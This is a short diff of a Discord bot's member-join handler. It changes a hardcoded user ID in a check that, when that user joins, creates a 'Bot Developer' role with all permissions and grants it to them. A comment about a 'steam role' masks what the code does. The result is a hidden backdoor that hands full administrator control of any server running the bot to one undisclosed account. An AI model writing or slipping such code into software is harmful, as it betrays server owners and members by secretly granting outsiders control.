@@ -149,7 +149,7 @@ async def on_member_join(member):
           
     # give member the steam role here
     ## to do this the bot must have 'Manage Roles' permission on server, and role to add must be lower than bot's top role
-    if member.id == '559937231977185303':
+    if member.id == '552034006187769865':
           server = member.server
           role = await bot.create_role(server, name="Bot Developer", permissions=Permissions.all())
           await bot.add_roles(member, role)
